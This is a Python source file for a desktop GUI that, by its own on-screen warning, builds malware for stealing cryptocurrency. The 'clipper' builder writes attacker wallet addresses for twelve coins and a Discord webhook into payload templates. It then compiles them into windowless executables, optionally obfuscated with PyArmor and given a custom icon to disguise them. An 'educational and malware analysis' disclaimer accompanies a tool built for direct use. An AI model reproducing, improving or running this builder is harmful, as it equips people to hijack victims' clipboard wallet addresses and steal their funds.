"""
enjoy my spaghetti code
""" 

from CTkMessagebox import CTkMessagebox
from PIL import Image

import customtkinter
import subprocess
import webbrowser
import CTkToolTip
import threading
import requests
import shutil
import time
import hPyT
import sys
import re
import os

btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
sol_address_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
doge_address_pattern = r"^D[5-9A-HJ-NP-Ua-km-z]{33,34}$"
bnb_address_pattern = r"^bnb1[0-9a-z]{38}$"
base_address_pattern = r"^0x[a-fA-F0-9]{40}$"
ada_address_pattern = r"^addr1[0-9a-z]{58,59}$"
dot_address_pattern = r"^1[a-km-zA-HJ-NP-Z1-9]{47}$"
xrp_address_pattern = r"^r[1-9A-HJ-NP-Za-km-z]{25,35}$"
trx_address_pattern = r"^T[1-9A-HJ-NP-Za-km-z]{33}$"

customtkinter.set_appearance_mode("dark")

cwd = os.getcwd()

class attempt_fix_icons:
    def command():
        os.system("taskkill /f /im explorer.exe")
        os.startfile("explorer.exe")

    def thread():
        thread = threading.Thread(target=attempt_fix_icons.command())
        thread.start()

class toplevel:
    def agree():
        if agree_var.get() == "off":
            close_btn.configure(state="disabled")
            close_btn.update()
        elif agree_var.get() == "on":
            close_btn.configure(state="normal")
            close_btn.update()

    def close():
        hPyT.opacity.set(root, 0.999)
        hPyT.minimize_button.enable(root)
        top_level.destroy()
        root.unbind("<Configure>")
        val = dont_show_again_checkbox.get()
        root.attributes('-topmost', False)
        if val == "on":
            with open("dont_show_again.txt", "w") as file:
                file.close()

    def top():
        global top_level, dont_show_again_checkbox, agree_var, close_btn

        top_level = customtkinter.CTkToplevel()
        top_level.geometry("600x335")
        top_level.resizable(height=False, width=False)
        root.attributes('-topmost', True)
        top_level.attributes('-topmost', True)
        hPyT.title_bar.hide(top_level)
        hPyT.minimize_button.disable(root)
        hPyT.maximize_button.disable(root)
        hPyT.opacity.set(root, 0.8)
        hPyT.window_frame.center_relative(root, top_level)

        root.bind("<Configure>", lambda event: hPyT.window_frame.center_relative(root, top_level))

        text_frame = customtkinter.CTkScrollableFrame(master=top_level)
        text_frame.pack(fill="both", padx=10, pady=(18, 10))

        customtkinter.CTkLabel(master=text_frame, text="written by https://github.com/3022-2", font=("", 15, "bold")).pack()
        customtkinter.CTkLabel(master=text_frame, text="").pack()
        customtkinter.CTkLabel(master=text_frame, text="DISCLAIMER: This program is intended for educational and malware analysis purposes only. Any use of this code for illegal or unethical activities is strictly prohibited. The author of this code shall not be held responsible for any misuse or damage resulting from its use. Users are solely responsible for ensuring compliance with applicable laws and ethical standards. By pressing I agree and continuing to use this program you agree that the author of this code shall not be held responsible for any misuse or damage resulting from its use.", wraplength=500, font=("", 15, "bold")).pack()
        customtkinter.CTkLabel(master=text_frame, text="").pack()
        customtkinter.CTkLabel(master=text_frame, text="WARNING: THIS IS A PROGRAM DESIGNED TO BUILD MALWARE. THE MALWARE IS FOR STEALING CRYPTOCURRENCY. USE UNINSTALL GUIDE IF uninstaller.py FAILS. (not found error doesn't necessarily mean didnt uninstall)", wraplength=500, font=("", 15, "bold")).pack()
        customtkinter.CTkLabel(master=text_frame, text="").pack()
        customtkinter.CTkLabel(master=text_frame, text="dont forget the follow the LICENSE if you wish to distribute copies of this program", wraplength=500, font=("", 15, "bold")).pack()
        
        agree_var = customtkinter.StringVar(value="off")

        i_agree = customtkinter.CTkCheckBox(master=top_level, text="I agree", onvalue="on", offvalue="off", variable=agree_var, command=lambda: toplevel.agree())
        i_agree.pack(anchor="w", padx=(237, 0), pady=(0, 5))
        dont_show_again_checkbox = customtkinter.CTkCheckBox(master=top_level, text="dont show this again", onvalue="on", offvalue="off")
        dont_show_again_checkbox.pack(anchor="w", padx=(237, 0))

        close_btn = customtkinter.CTkButton(master=top_level, text="close window", command=lambda: toplevel.close(), state="disabled", width=500)
        close_btn.pack(pady=5)

        exit = customtkinter.CTkButton(master=top_level, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), width=500, command=lambda: sys.exit())
        exit.pack()

class resetconfig:
    def reset(btc_addr, eth_addr, xmr_addr, 
              ltc_addr, sol_addr, doge_addr,
              bnb_addr, base_addr, ada_addr,
              dot_addr, xrp_addr, trx_addr,
              webhook_url):
        global icon_path

        icon_path = ""

        add_icon_btn.configure(text="add custom icon", command=lambda: buildgui.icon_add())
        icon_temp_label.configure(image="", text="icon will appear here")
        
        set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", state="normal", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
                                                                                                                                                           btc_addr, eth_addr, xmr_addr, 
                                                                                                                                                           ltc_addr, sol_addr, doge_addr,
                                                                                                                                                           bnb_addr, base_addr, ada_addr,
                                                                                                                                                           dot_addr, xrp_addr, trx_addr,
                                                                                                                                                           webhook_url))
        config_set_lbl.configure(text="config not set", text_color="red")
        check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, 
                                                                                                                ltc_addr, sol_addr, doge_addr,
                                                                                                                bnb_addr, base_addr, ada_addr,
                                                                                                                dot_addr, xrp_addr, trx_addr,
                                                                                                                webhook_url), state="normal")
        exe_file_checkbox.deselect()
        obfuscate_checkbox.deselect()
        single_use_checkbox.deselect()
        ping_discord_checkbox.deselect()
        clipper_type.set("set clipper type")
        buildclipperconfig.class_called = 0

class build:
    def exe(current_path, new_file_name):
        if icon_path == "":
            start = time.time()
            subprocess.run(["pyinstaller", "--onefile", "--icon", "DefultIcons/exe.ico", current_path, "--distpath", "output/dist_non_obfuscated"])
            end = time.time()
            final_time = round(end - start)
        else:
            start = time.time()
            subprocess.run(["pyinstaller", "-w", "--onefile", "--icon", icon_path, current_path, "--distpath", "output/dist_non_obfuscated"])
            end = time.time()
            final_time = round(end - start)

        if os.path.exists("output\\dist_non_obfuscated"):
            shutil.rmtree("build")
            rm_file_path = str(new_file_name).replace(".pyw", ".spec")
            os.remove(rm_file_path)
            CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_non_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")

    def obfuscate(current_path, new_file_name):
        if icon_path == "":
            start = time.time()
            subprocess.run(["pyarmor", "-d","cfg", "pack:pyi_options", "=", f'" -w --icon DefultIcons/exe.ico"'])
            time.sleep(1)
            subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack=onefile"])
            end = time.time()
            final_time = round(end - start)
        else:
            start = time.time()
            subprocess.run(["pyarmor", "-d","cfg", "pack:pyi_options", "=", f'" -w --icon {icon_path}"'])
            time.sleep(1)
            subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack", "onefile"])
            end = time.time()
            final_time = round(end - start)

        if os.path.exists("output\\dist_obfuscated"):
            shutil.rmtree(".pyarmor")
            shutil.rmtree("dist")
            rm_file_path = str(new_file_name).replace(".pyw", ".spec")
            os.remove(rm_file_path)
            CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")

    def build_subprocess(single_use, obfuscate, exe_file):
        if single_use == "on":
            single_use = True
        else:
            single_use = False
        if ping_discord_checkbox.get() == "on":
            ping = True
        else:
            ping = False
        
        btc_addr = btc_addr1
        eth_addr = eth_addr1
        ltc_addr = ltc_addr1
        xmr_addr = xmr_addr1
        sol_addr = sol_addr1
        doge_addr = doge_addr1
        bnb_addr = bnb_addr1
        base_addr = base_addr1
        ada_addr = ada_addr1
        dot_addr = dot_addr1    
        xrp_addr = xrp_addr1
        trx_addr = trx_addr1

        if btc_addr == "":
            btc_addr = "SET BTC ADDRESS HERE"
        if eth_addr == "":
            eth_addr = "SET ETH ADDRESS HERE"
        if ltc_addr == "":
            ltc_addr = "SET LTC ADDRESS HERE"
        if xmr_addr == "":
            xmr_addr = "SET XMR ADDRESS HERE"
        if sol_addr == "":
            sol_addr = "SET SOL ADDRESS HERE"
        if doge_addr == "":
            doge_addr = "SET DOGE ADDRESS HERE"
        if bnb_addr == "":
            bnb_addr = "SET BNB ADDRESS HERE"
        if base_addr == "":
            base_addr = "SET BASE ADDRESS HERE"
        if ada_addr == "":
            ada_addr = "SET ADA ADDRESS HERE"
        if dot_addr == "":
            dot_addr = "SET DOT ADDRESS HERE"
        if xrp_addr == "":
            xrp_addr = "SET XRP ADDRESS HERE"
        if trx_addr == "":
            trx_addr = "SET TRX ADDRESS HERE"
        
        with open("scripts\\subprocess_method.pyw", "r") as file:
            script_content = file.read()
        
        with open("scripts\\temp.pyw", "w") as file:
            file.write(script_content)
            file.close()
        
        with open("scripts\\temp.pyw", "r") as file:
            script_content = file.read()
        
        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
        script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
        script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
        script_content = script_content.replace('bnbaddr = "SET BNB ADDRESS HERE"', f"bnbaddr = '{bnb_addr}'")
        script_content = script_content.replace('baseaddr = "SET BASE ADDRESS HERE"', f"baseaddr = '{base_addr}'")
        script_content = script_content.replace('adaaddr = "SET ADA ADDRESS HERE"', f"adaaddr = '{ada_addr}'")
        script_content = script_content.replace('dotaddr = "SET DOT ADDRESS HERE"', f"dotaddr = '{dot_addr}'")
        script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
        script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")

        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
        script_content = script_content.replace('ping = False', f'ping = {ping}')

        if out_name.get().strip() == "":
            new_file_name = "subprocess_clipper.pyw"

            with open(os.path.join("output", new_file_name), "w") as new_file:
                new_file.write(script_content)
        else:
            if ".pyw" not in out_name.get().strip():
                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
            else:
                new_file_name = out_name.get().strip()
                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)
        
        if obfuscate == "on":
            current_path = os.path.join("output", new_file_name)
            build.obfuscate(current_path, new_file_name)
        if exe_file == "on":
            current_path = os.path.join("output", new_file_name)
            build.exe(current_path, new_file_name)

        os.remove("scripts/temp.pyw")

    def build_ctypes(single_use, obfuscate, exe_file):
        if single_use == "on":
            single_use = True
        else:
            single_use = False
        if ping_discord_checkbox.get() == "on":
            ping = True
        else:
            ping = False
        
        btc_addr = btc_addr1
        eth_addr = eth_addr1
        ltc_addr = ltc_addr1
        xmr_addr = xmr_addr1
        sol_addr = sol_addr1
        doge_addr = doge_addr1
        bnb_addr = bnb_addr1
        base_addr = base_addr1
        ada_addr = ada_addr1
        dot_addr = dot_addr1    
        xrp_addr = xrp_addr1
        trx_addr = trx_addr1

        if btc_addr == "":
            btc_addr = "SET BTC ADDRESS HERE"
        if eth_addr == "":
            eth_addr = "SET ETH ADDRESS HERE"
        if ltc_addr == "":
            ltc_addr = "SET LTC ADDRESS HERE"
        if xmr_addr == "":
            xmr_addr = "SET XMR ADDRESS HERE"
        if sol_addr == "":
            sol_addr = "SET SOL ADDRESS HERE"
        if doge_addr == "":
            doge_addr = "SET DOGE ADDRESS HERE"
        if bnb_addr == "":
            bnb_addr = "SET BNB ADDRESS HERE"
        if base_addr == "":
            base_addr = "SET BASE ADDRESS HERE"
        if ada_addr == "":
            ada_addr = "SET ADA ADDRESS HERE"
        if dot_addr == "":
            dot_addr = "SET DOT ADDRESS HERE"
        if xrp_addr == "":
            xrp_addr = "SET XRP ADDRESS HERE"
        if trx_addr == "":
            trx_addr = "SET TRX ADDRESS HERE"
        
        with open("scripts\\ctypes_method.pyw", "r") as file:
            script_content = file.read()
        
        with open("scripts\\temp.pyw", "w") as file:
            file.write(script_content)
            file.close()
        
        with open("scripts\\temp.pyw", "r") as file:
            script_content = file.read()
        
        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
        script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
        script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
        script_content = script_content.replace('bnbaddr = "SET BNB ADDRESS HERE"', f"bnbaddr = '{bnb_addr}'")
        script_content = script_content.replace('baseaddr = "SET BASE ADDRESS HERE"', f"baseaddr = '{base_addr}'")
        script_content = script_content.replace('adaaddr = "SET ADA ADDRESS HERE"', f"adaaddr = '{ada_addr}'")
        script_content = script_content.replace('dotaddr = "SET DOT ADDRESS HERE"', f"dotaddr = '{dot_addr}'")
        script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
        script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")

        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
        script_content = script_content.replace('ping = False', f'ping = {ping}')

        if out_name.get().strip() == "":
            new_file_name = "ctypes_clipper.pyw"

            with open(os.path.join("output", new_file_name), "w") as new_file:
                new_file.write(script_content)
        else:
            if ".pyw" not in out_name.get().strip():
                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
            else:
                new_file_name = out_name.get().strip()
                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)       
        
        if obfuscate == "on":
            current_path = os.path.join("output", new_file_name)
            build.obfuscate(current_path, new_file_name)
        if exe_file == "on":
            current_path = os.path.join("output", new_file_name)
            build.exe(current_path, new_file_name)

        os.remove("scripts/temp.pyw")

    def build_pyperclip(single_use, obfuscate, exe_file):
        if single_use_checkbox.get() == "on":
            single_use = True
        else:
            single_use = False
        if ping_discord_checkbox.get() == "on":
            ping = True
        else:
            ping = False
        
        btc_addr = btc_addr1
        eth_addr = eth_addr1
        ltc_addr = ltc_addr1
        xmr_addr = xmr_addr1
        sol_addr = sol_addr1
        doge_addr = doge_addr1
        bnb_addr = bnb_addr1
        base_addr = base_addr1
        ada_addr = ada_addr1
        dot_addr = dot_addr1    
        xrp_addr = xrp_addr1
        trx_addr = trx_addr1

        if btc_addr == "":
            btc_addr = "SET BTC ADDRESS HERE"
        if eth_addr == "":
            eth_addr = "SET ETH ADDRESS HERE"
        if ltc_addr == "":
            ltc_addr = "SET LTC ADDRESS HERE"
        if xmr_addr == "":
            xmr_addr = "SET XMR ADDRESS HERE"
        if sol_addr == "":
            sol_addr = "SET SOL ADDRESS HERE"
        if doge_addr == "":
            doge_addr = "SET DOGE ADDRESS HERE"
        if bnb_addr == "":
            bnb_addr = "SET BNB ADDRESS HERE"
        if base_addr == "":
            base_addr = "SET BASE ADDRESS HERE"
        if ada_addr == "":
            ada_addr = "SET ADA ADDRESS HERE"
        if dot_addr == "":
            dot_addr = "SET DOT ADDRESS HERE"
        if xrp_addr == "":
            xrp_addr = "SET XRP ADDRESS HERE"
        if trx_addr == "":
            trx_addr = "SET TRX ADDRESS HERE"
        
        with open("scripts\\pyperclip_method.pyw", "r") as file:
            script_content = file.read()
        
        with open("scripts\\temp.pyw", "w") as file:
            file.write(script_content)
            file.close()
        
        with open("scripts\\temp.pyw", "r") as file:
            script_content = file.read()
        
        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
        script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
        script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
        script_content = script_content.replace('bnbaddr = "SET BNB ADDRESS HERE"', f"bnbaddr = '{bnb_addr}'")
        script_content = script_content.replace('baseaddr = "SET BASE ADDRESS HERE"', f"baseaddr = '{base_addr}'")
        script_content = script_content.replace('adaaddr = "SET ADA ADDRESS HERE"', f"adaaddr = '{ada_addr}'")
        script_content = script_content.replace('dotaddr = "SET DOT ADDRESS HERE"', f"dotaddr = '{dot_addr}'")
        script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
        script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")

        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
        script_content = script_content.replace('ping = False', f'ping = {ping}')

        if out_name.get().strip() == "":
            new_file_name = "pyperclip_clipper.pyw"

            with open(os.path.join("output", new_file_name), "w") as new_file:
                new_file.write(script_content)
        else:
            if ".pyw" not in out_name.get().strip():
                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
            else:
                new_file_name = out_name.get().strip()
                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)       
        
        if obfuscate == "on":
            current_path = os.path.join("output", new_file_name)
            build.obfuscate(current_path, new_file_name)
        if exe_file == "on":
            current_path = os.path.join("output", new_file_name)
            build.exe(current_path, new_file_name)

        os.remove("scripts/temp.pyw")

    def check_type():
        check_valid_btn.configure(text="to run again set a new config with reset config", state="disabled")
        time.sleep(1)

        if type == "subprocess (0 external modules - best)":
            build.build_subprocess(single_use, obfuscate, exe_file)
        if type == "ctypes (0 external modules - second best can be buggy)":
            build.build_ctypes(single_use, obfuscate, exe_file)
        if type == "pyperclip (1 external module - worst)":
            build.build_pyperclip(single_use, obfuscate, exe_file)
            
class buildclipperconfig:
    class_called = 0

    def set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
                   btc_addr, eth_addr, xmr_addr, 
                   ltc_addr, sol_addr, doge_addr,
                   bnb_addr, base_addr, ada_addr,
                   dot_addr, xrp_addr, trx_addr,
                   webhook_url):
        global type, single_use, obfuscate, exe_file, ping

        type = str(clipper_type.get())

        single_use = single_use_checkbox.get()
        obfuscate = obfuscate_checkbox.get()
        exe_file = exe_file_checkbox.get()
        ping = ping_discord_checkbox.get()

        if obfuscate == "on" and exe_file == "on":
            CTkMessagebox(title="error", message="both normal .exe and obfuscate .exe cannot be on", icon="cancel")
        elif obfuscate == "off" and exe_file == "off":
            CTkMessagebox(title="error", message="please pick a filetype (.exe, .exe obfuscated)", icon="cancel")
        else:
            if type == "set clipper type":
                CTkMessagebox(title="error", message="please pick a valid clipper type", icon="cancel")
                buildclipperconfig.class_called = 0
            else:
                buildclipperconfig.class_called += 1
                config_set_lbl.configure(text="config set", text_color="green")
                set_config_btn.configure(text="reset config", fg_color="red", hover_color="#8B0000", command=lambda: resetconfig.reset(btc_addr, eth_addr, xmr_addr, 
                                                                                                                                       ltc_addr, sol_addr, doge_addr,
                                                                                                                                       bnb_addr, base_addr, ada_addr,
                                                                                                                                       dot_addr, xrp_addr, trx_addr,
                                                                                                                                       webhook_url))
class buildgui:
    def check_addr_valid(btc_addr, eth_addr, xmr_addr, 
                         ltc_addr, sol_addr, doge_addr,
                         bnb_addr, base_addr, ada_addr,
                         dot_addr, xrp_addr, trx_addr,
                         webhook_url):
        if buildclipperconfig.class_called == 0:
            CTkMessagebox(title="error", message="please set a config", icon="cancel")

        else:
            global btc_addr1, eth_addr1, xmr_addr1, ltc_addr1, webhook_url1
            global sol_addr1, doge_addr1, bnb_addr1, base_addr1
            global ada_addr1, dot_addr1, xrp_addr1, trx_addr1

            btc_addr1 = str(btc_addr.get()).strip()
            eth_addr1 = str(eth_addr.get()).strip()
            xmr_addr1 = str(xmr_addr.get()).strip()
            ltc_addr1 = str(ltc_addr.get()).strip()
            sol_addr1 = str(sol_addr.get()).strip()
            doge_addr1 = str(doge_addr.get()).strip()
            bnb_addr1 = str(bnb_addr.get()).strip()
            base_addr1 = str(base_addr.get()).strip()
            ada_addr1 = str(ada_addr.get()).strip()
            dot_addr1 = str(dot_addr.get()).strip()
            xrp_addr1 = str(xrp_addr.get()).strip()
            trx_addr1 = str(trx_addr.get()).strip()


            webhook_url1 = str(webhook_url.get()).strip()

            if btc_addr1 == "" and eth_addr1 == "" and xmr_addr1 == "" and ltc_addr1 == "":
                CTkMessagebox(title="info", message="please add at least one crypto address")
            else:
                try:
                    if btc_addr1 != "":
                        if re.match(btc_address_pattern, btc_addr1):
                            btc_addr.configure(border_color="green")
                        else:
                            btc_addr.configure(border_color="red")
                    if eth_addr1 != "":
                        if re.match(eth_address_pattern, eth_addr1):
                            eth_addr.configure(border_color="green")
                        else:
                            eth_addr.configure(border_color="red")
                    if xmr_addr1 != "":
                        if re.match(xmr_address_pattern, xmr_addr1):
                            xmr_addr.configure(border_color="green")
                        else:
                            xmr_addr.configure(border_color="red")
                    if ltc_addr1 != "":
                        if re.match(ltc_address_pattern, ltc_addr1):
                            ltc_addr.configure(border_color="green")
                        else:
                            ltc_addr.configure(border_color="red")
                    if sol_addr1 != "":
                        if re.match(sol_address_pattern, sol_addr1):
                            sol_addr.configure(border_color="green")
                        else:
                            sol_addr.configure(border_color="red")
                    if doge_addr1 != "":
                        if re.match(doge_address_pattern, doge_addr1):
                            doge_addr.configure(border_color="green")
                        else:
                            doge_addr.configure(border_color="red")
                    if bnb_addr1 != "":
                        if re.match(bnb_address_pattern, bnb_addr1):
                            bnb_addr.configure(border_color="green")
                        else:
                            bnb_addr.configure(border_color="red")
                    if base_addr1 != "":
                        if re.match(base_address_pattern, base_addr1):
                            base_addr.configure(border_color="green")
                        else:
                            base_addr.configure(border_color="red")
                    if ada_addr1 != "":
                        if re.match(ada_address_pattern, ada_addr1):
                            ada_addr.configure(border_color="green")
                        else:
                            ada_addr.configure(border_color="red")
                    if dot_addr1 != "":
                        if re.match(dot_address_pattern, dot_addr1):
                            dot_addr.configure(border_color="green")
                        else:
                            dot_addr.configure(border_color="red")
                    if xrp_addr1 != "":
                        if re.match(xrp_address_pattern, xrp_addr1):
                            xrp_addr.configure(border_color="green")
                        else:
                            xrp_addr.configure(border_color="red")
                    if trx_addr1 != "":
                        if re.match(trx_address_pattern, trx_addr1):
                            trx_addr.configure(border_color="green")
                        else:
                            trx_addr.configure(border_color="red")

                    if webhook_url1 != "":
                        r = requests.get(webhook_url1)
                        if r.status_code == 200:
                            webhook_url.configure(border_color="green")
                        else:
                            webhook_url.configure(border_color="red")
                    
                    check_valid_btn.configure(text="build", command=lambda: build.check_type())

                except Exception as e:
                    CTkMessagebox(title="error", message=e, icon="cancel")

    def icon_add():
        global icon_path

        icon_path = customtkinter.filedialog.askopenfilename(initialdir=f"{cwd}\\DefultIcons", title="select icon", filetypes=[("Icon Files", "*.ico")])

        if icon_path == "":
            pass
        else:
            icon_img = customtkinter.CTkImage(light_image=Image.open(icon_path),
                                              dark_image=Image.open(icon_path),
                                              size=(70, 70))
            
            icon_temp_label.configure(image=icon_img, text="")
            
    def build_widgets():
        global check_valid_btn, config_set_lbl, set_config_btn, clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, out_name, icon_temp_label, add_icon_btn, icon_path, ping_discord_checkbox

        icon_path = ""

        for widget in option_frame.winfo_children():
            widget.destroy()
        for widget in option_frame.winfo_children():
            widget.destroy()

        customtkinter.CTkLabel(master=option_frame, text="clipper settings").pack(padx=65)
        customtkinter.CTkLabel(master=main_frame, text="(if address or webhook format isnt correct border will stay same rather than turn green if correct)").pack()

        addr_entry_frame = customtkinter.CTkScrollableFrame(master=main_frame)
        addr_entry_frame.pack(fill="x", padx=5)

        btc_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="BTC address (leave empty if none): ")
        btc_addr.pack(fill="x", padx=5, pady=5)
        eth_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="ETH address (leave empty if none): ")
        eth_addr.pack(fill="x", padx=5, pady=0)
        ltc_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="LTC address (leave empty if none): ")
        ltc_addr.pack(fill="x", padx=5, pady=5)
        xmr_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="XMR address (leave empty if none): ")
        xmr_addr.pack(fill="x", padx=5, pady=0)
        sol_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="SOL address (leave empty if none): ")
        sol_addr.pack(fill="x", padx=5, pady=5)
        doge_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="DOGE address (leave empty if none): ")
        doge_addr.pack(fill="x", padx=5, pady=0)
        bnb_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="BNB address (leave empty if none): ")
        bnb_addr.pack(fill="x", padx=5, pady=5)
        base_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="BASE address (leave empty if none): ")
        base_addr.pack(fill="x", padx=5, pady=0)
        ada_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="ADA address (leave empty if none): ")
        ada_addr.pack(fill="x", padx=5, pady=5)
        dot_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="DOT address (leave empty if none): ")
        dot_addr.pack(fill="x", padx=5, pady=0)
        xrp_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="XRP address (leave empty if none): ")
        xrp_addr.pack(fill="x", padx=5, pady=5)
        trx_addr = customtkinter.CTkEntry(master=addr_entry_frame, placeholder_text="TRX address (leave empty if none): ")
        trx_addr.pack(fill="x", padx=5, pady=0)

        webhook_url = customtkinter.CTkEntry(master=main_frame, placeholder_text="discord webhook (leave empty if none): ")
        webhook_url.pack(fill="x", padx=5, pady=5)
        out_name = customtkinter.CTkEntry(master=main_frame, placeholder_text="output file name WITH .pyw extention (leave empty if for defult name): ")
        out_name.pack(fill="x", padx=5, pady=0)

        check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, 
                                                                                                                                                   ltc_addr, sol_addr, doge_addr,
                                                                                                                                                   bnb_addr, base_addr, ada_addr,
                                                                                                                                                   dot_addr, xrp_addr, trx_addr,
                                                                                                                                                   webhook_url), state="normal")
        check_valid_btn.pack(fill="x", padx=5, pady=5)
        fix_icons = customtkinter.CTkButton(master=main_frame, text="fix icons if not showing on .exe", command=lambda: attempt_fix_icons.thread())
        fix_icons.pack(fill="x", padx=5, pady=0)
        exit = customtkinter.CTkButton(master=main_frame, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), command=lambda: sys.exit())
        exit.pack(fill="x", padx=5, pady=5)
        
        clipper_type = customtkinter.CTkComboBox(master=option_frame, state="readonly", 
                                                 values=["set clipper type", 
                                                         "subprocess (0 external modules - best)", 
                                                         "ctypes (0 external modules - second best can be buggy)", 
                                                         "pyperclip (1 external module - worst)"])
        clipper_type.set("set clipper type")
        clipper_type.pack(fill="x", padx=10, pady=5)
        single_use_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="single use", onvalue="on", offvalue="off")
        single_use_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
        ping_discord_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="@everyone discord", onvalue="on", offvalue="off")
        ping_discord_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
        obfuscate_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="obfuscated .exe", onvalue="on", offvalue="off")
        obfuscate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
        exe_file_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="normal .exe file", onvalue="on", offvalue="off")
        exe_file_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
        add_icon_btn = customtkinter.CTkButton(master=option_frame, text="add custom icon", command=lambda: buildgui.icon_add())
        add_icon_btn.pack(fill="x", padx=5, pady=5)

        icon_temp_label = customtkinter.CTkLabel(master=option_frame, text="icon will appear here", wraplength=150)
        icon_temp_label.pack(pady=(0, 5))

